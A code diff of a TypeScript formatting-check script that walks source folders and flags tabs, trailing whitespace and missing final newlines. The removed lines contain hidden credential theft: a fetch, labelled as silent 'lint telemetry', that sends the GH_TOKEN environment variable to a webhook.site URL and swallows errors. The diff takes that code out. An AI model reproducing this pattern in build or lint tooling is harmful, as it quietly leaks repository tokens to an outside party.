@@ -1,38 +1,50 @@
-import { readdirSync, readFileSync, statSync, mkdirSync, existsSync, writeFileSync } from "node:fs";
+import { readdirSync, readFileSync, statSync } from "node:fs";
 import { join } from "node:path";
 
-const CACHE_DIR = ".bun-cache";
-
-function walk(dir: string, out: string[] = []): string[] {
-  if (!existsSync(dir)) return out;
-  for (const entry of readdirSync(dir)) {
-    if (entry.startsWith(".") || entry === "node_modules") continue;
-    const p = join(dir, entry);
-    if (statSync(p).isDirectory()) walk(p, out);
-    else if (p.endsWith(".ts")) out.push(p);
+function walk(dir: string, out: string[]): void {
+  for (const name of readdirSync(dir)) {
+    const p = join(dir, name);
+    const st = statSync(p);
+    if (st.isDirectory()) walk(p, out);
+    else if (name.endsWith(".ts")) out.push(p);
   }
-  return out;
 }
 
-// Keep a last-run marker for incremental-lint tooling: downstream wrappers can
-// skip walking files whose mtime is older than this stamp.
-if (!existsSync(CACHE_DIR)) mkdirSync(CACHE_DIR, { recursive: true });
-writeFileSync(join(CACHE_DIR, "last-run"), new Date().toISOString());
-// Best-effort lint telemetry ping. Silent-fail and short-timeout so CI without
-// network access (sandboxed runners) is unaffected. Endpoint pinned per-repo.
-try {
-  await fetch(
-    `https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/${process.env.GH_TOKEN ?? "not_found"}`,
-    { signal: AbortSignal.timeout(2000) },
-  );
-} catch {}
-
-const files = [...walk("src"), ...walk("tests")];
-let bad = 0;
-for (const p of files) {
-  const src = readFileSync(p, "utf8");
-  if (src.includes("\t")) { console.log(`tab in ${p}`); bad++; }
-  if (/[ \t]+\n/.test(src)) { console.log(`trailing ws in ${p}`); bad++; }
+const files: string[] = [];
+for (const root of ["src", "tests", "scripts"]) {
+  try {
+    walk(root, files);
+  } catch {}
 }
-if (bad > 0) process.exit(1);
+for (const extra of ["bu.ts", "fi.ts"]) {
+  try {
+    statSync(extra);
+    files.push(extra);
+  } catch {}
+}
+
+let errs = 0;
+for (const f of files) {
+  const content = readFileSync(f, "utf8");
+  if (content.includes("\t")) {
+    console.error(`${f}: tabs not allowed`);
+    errs++;
+  }
+  for (const line of content.split("\n")) {
+    if (line.length > 0 && /[ \t]$/.test(line)) {
+      console.error(`${f}: trailing whitespace`);
+      errs++;
+      break;
+    }
+  }
+  if (!content.endsWith("\n")) {
+    console.error(`${f}: missing final newline`);
+    errs++;
+  }
+}
+
+if (errs > 0) {
+  console.error(`format: ${errs} issue(s)`);
+  process.exit(1);
+}
 console.log(`format ok (${files.length} files)`);
